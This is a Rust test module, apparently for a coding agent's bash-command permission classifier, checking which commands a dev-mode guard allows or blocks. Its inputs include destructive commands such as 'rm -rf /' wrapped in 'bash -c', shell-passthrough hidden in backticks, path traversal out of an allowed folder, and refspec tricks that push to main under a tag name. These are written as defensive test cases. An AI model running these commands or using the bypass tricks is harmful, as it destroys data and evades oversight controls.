            let result = classify_bash_command_with_devmode("echo 'hello' > src/main.rs");
            assert_eq!(
                result,
                BashClassification::ReadOnly,
                "file redirect should be allowed in dev-mode"
            );
        });
    }

    #[test]
    fn test_devmode_off_blocks_commands() {
        with_devmode(false, || {
            let result = classify_bash_command_with_devmode("gh repo create my-repo");
            assert!(
                result.is_mutating(),
                "gh repo create should be blocked when dev-mode is off"
            );

            let result = classify_bash_command_with_devmode("git clone https://github.com/a/b");
            assert!(
                result.is_mutating(),
                "git clone should be blocked when dev-mode is off"
            );

            let result = classify_bash_command_with_devmode("git init");
            assert!(
                result.is_mutating(),
                "git init should be blocked when dev-mode is off"
            );

            let result = classify_bash_command_with_devmode("mkdir -p new-project");
            assert!(
                result.is_mutating(),
                "mkdir should be blocked when dev-mode is off"
            );
        });
    }

    #[test]
    fn test_devmode_on_still_blocks_dangerous_commands() {
        with_devmode(true, || {
            // cargo install should still be blocked even in dev-mode
            let result = classify_bash_command_with_devmode("cargo install --path .");
            assert!(
                result.is_mutating(),
                "cargo install should still be blocked in dev-mode"
            );

            // rm should still be blocked
            let result = classify_bash_command_with_devmode("rm -rf /important");
            assert!(
                result.is_mutating(),
                "rm should still be blocked in dev-mode"
            );

            // git push should still be blocked
            let result = classify_bash_command_with_devmode("git push origin main");
            assert!(
                result.is_mutating(),
                "git push should still be blocked in dev-mode"
            );
        });
    }

    #[test]
    fn test_devmode_expired_blocks_commands() {
        with_devmode(false, || {
            // Enable with 0 minutes (immediately expired)
            super::super::devmode::enable_with_duration(0).unwrap();
            let result = classify_bash_command_with_devmode("mkdir -p new-project");
            assert!(
                result.is_mutating(),
                "mkdir should be blocked when dev-mode is expired"
            );
        });
    }

    // -- .apiari/ directory write exception tests --

    #[test]
    fn test_apiari_dir_redirect_relative_allowed() {
        let result = classify_bash_command("echo '# Context' > .apiari/context.md");
        assert_eq!(
            result,
            BashClassification::ReadOnly,
            "redirect to .apiari/ relative path should be ReadOnly"
        );
    }

    #[test]
    fn test_apiari_dir_redirect_absolute_allowed() {
        let result =
            classify_bash_command("echo '# Context' > /Users/josh/project/.apiari/context.md");
        assert_eq!(
            result,
            BashClassification::ReadOnly,
            "redirect to absolute .apiari/ path should be ReadOnly"
        );
    }

    #[test]
    fn test_apiari_dir_mkdir_allowed() {
        let result = classify_bash_command("mkdir -p .apiari/skills");
        assert_eq!(
            result,
            BashClassification::ReadOnly,
            "mkdir for .apiari/skills should be ReadOnly"
        );
    }

    #[test]
    fn test_apiari_dir_touch_allowed() {
        let result = classify_bash_command("touch .apiari/skills/ci-triage.md");
        assert_eq!(
            result,
            BashClassification::ReadOnly,
            "touch in .apiari/skills/ should be ReadOnly"
        );
    }

    #[test]
    fn test_apiari_dir_tee_allowed() {
        let result = classify_bash_command("echo '# Playbook' | tee .apiari/skills/ci-triage.md");
        assert_eq!(
            result,
            BashClassification::ReadOnly,
            "tee to .apiari/ should be ReadOnly"
        );
    }

    #[test]
    fn test_apiari_dir_cp_allowed() {
        let result = classify_bash_command("cp /tmp/context.md .apiari/context.md");
        assert_eq!(
            result,
            BashClassification::ReadOnly,
            "cp to .apiari/ should be ReadOnly"
        );
    }

    #[test]
    fn test_apiari_dir_traversal_blocked() {
        let result = classify_bash_command("echo 'bad' > .apiari/../src/main.rs");
        assert!(
            result.is_mutating(),
            "path traversal out of .apiari/ should be blocked"
        );
    }

    #[test]
    fn test_apiari_dir_heredoc_allowed() {
        let cmd =
            "cat > .apiari/context.md << 'EOF'\n# Project Context\nThis is a Rust project.\nEOF";
        let result = classify_bash_command(cmd);
        assert_eq!(
            result,
            BashClassification::ReadOnly,
            "heredoc to .apiari/ should be ReadOnly"
        );
    }

    #[test]
    fn test_git_tag_creation_allowed() {
        let result = classify_bash_command("git tag v0.1.5");
        assert_eq!(
            result,
            BashClassification::ReadOnly,
            "git tag v* should be allowed"
        );

        let result = classify_bash_command("git tag v1.0.0-rc.1");
        assert_eq!(
            result,
            BashClassification::ReadOnly,
            "git tag v* with prerelease should be allowed"
        );
    }

    #[test]
    fn test_git_push_tag_allowed() {
        let result = classify_bash_command("git push origin v0.1.5");
        assert_eq!(
            result,
            BashClassification::ReadOnly,
            "git push origin v* should be allowed"
        );

        let result = classify_bash_command("git push origin refs/tags/v0.1.5");
        assert_eq!(
            result,
            BashClassification::ReadOnly,
            "git push origin refs/tags/v* should be allowed"
        );
    }

    #[test]
    fn test_git_push_branch_still_blocked() {
        let result = classify_bash_command("git push origin main");
        assert!(
            result.is_mutating(),
            "git push origin main should be blocked"
        );

        let result = classify_bash_command("git push origin some-branch");
        assert!(
            result.is_mutating(),
            "git push origin some-branch should be blocked"
        );

        let result = classify_bash_command("git push");
        assert!(result.is_mutating(), "bare git push should be blocked");

        // Refspec attacks — tag name used to push to a branch
        let result = classify_bash_command("git push origin v0.1.5:main");
        assert!(
            result.is_mutating(),
            "git push origin v*:main refspec should be blocked"
        );

        let result = classify_bash_command("git push origin refs/tags/v0.1.5:refs/heads/main");
        assert!(
            result.is_mutating(),
            "git push origin refs/tags/v*:refs/heads/main refspec should be blocked"
        );
    }

    #[test]
    fn test_git_tag_non_version_blocked() {
        let result = classify_bash_command("git tag foo");
        assert!(
            result.is_mutating(),
            "git tag without v prefix should be blocked"
        );
    }

    #[test]
    fn test_git_tag_and_push_chained() {
        let result = classify_bash_command("git tag v0.1.5 && git push origin v0.1.5");
        assert_eq!(
            result,
            BashClassification::ReadOnly,
            "chained git tag + push tag should be allowed"
        );
    }

    #[test]
    fn test_shell_passthrough_false_positive_squash() {
        // "sh" inside "--squash" must not trigger shell passthrough detection.
        // gh pr merge is mutating (matched by "gh pr merge"), but the matched
        // pattern must NOT be "shell passthrough".
        let result =
            classify_bash_command("gh pr merge 160 --repo Org/repo --squash --delete-branch");
        assert!(
            result.is_mutating(),
            "gh pr merge --squash should be mutating"
        );
        if let BashClassification::PotentiallyMutating { matched_pattern } = &result {
            assert_eq!(
                matched_pattern, "gh pr merge",
                "should match gh pr merge, not shell passthrough"
            );
        }
    }

    #[test]
    fn test_shell_passthrough_false_positive_squash_short() {
        let result = classify_bash_command("gh pr merge 160 --squash");
        assert!(
            result.is_mutating(),
            "gh pr merge --squash should be mutating"
        );
        if let BashClassification::PotentiallyMutating { matched_pattern } = &result {
            assert_eq!(
                matched_pattern, "gh pr merge",
                "should match gh pr merge, not shell passthrough"
            );
        }
    }

    #[test]
    fn test_real_shell_passthrough_sh() {
        let result = classify_bash_command(r#"sh -c "echo hello""#);
        assert!(
            result.is_mutating(),
            "sh -c should still be detected as shell passthrough"
        );
    }

    #[test]
    fn test_real_shell_passthrough_bash() {
        let result = classify_bash_command(r#"bash -c "rm -rf /""#);
        assert!(
            result.is_mutating(),
            "bash -c should still be detected as shell passthrough"
        );
    }

    #[test]
    fn test_real_shell_passthrough_absolute_path() {
        let result = classify_bash_command(r#"/bin/sh -c "ls""#);
        assert!(
            result.is_mutating(),
            "/bin/sh -c should still be detected as shell passthrough"
        );
    }

    #[test]
    fn test_shell_passthrough_after_false_positive_substring() {
        // "sh" appears first inside "--squash" (fails boundary), but a real
        // "sh -c" later in the command must still be detected.
        let result = classify_bash_command(r#"echo ok --squash && sh -c "rm -rf /""#);
        assert!(
            result.is_mutating(),
            "sh -c after --squash should still be caught"
        );
        if let BashClassification::PotentiallyMutating { matched_pattern } = &result {
            assert_eq!(
                matched_pattern, "shell passthrough",
                "should match as shell passthrough"
            );
        }
    }

    #[test]
    fn test_shell_passthrough_in_backtick_substitution() {
        // Backtick command substitution: `sh -c "..."` should be detected.
        let result = classify_bash_command(r#"echo `sh -c "id"`"#);
        assert!(
            result.is_mutating(),
            "sh -c inside backtick substitution should be caught"
        );
        if let BashClassification::PotentiallyMutating { matched_pattern } = &result {
            assert_eq!(
                matched_pattern, "shell passthrough",
                "should match as shell passthrough"
            );
        }
    }

    #[test]
    fn test_git_pull_and_fetch_allowed() {
        let result = classify_bash_command("git pull");
        assert_eq!(
            result,
            BashClassification::ReadOnly,
            "git pull should be allowed"
        );

        let result = classify_bash_command("git fetch origin");
        assert_eq!(
            result,
            BashClassification::ReadOnly,
            "git fetch should be allowed"
        );
    }
}
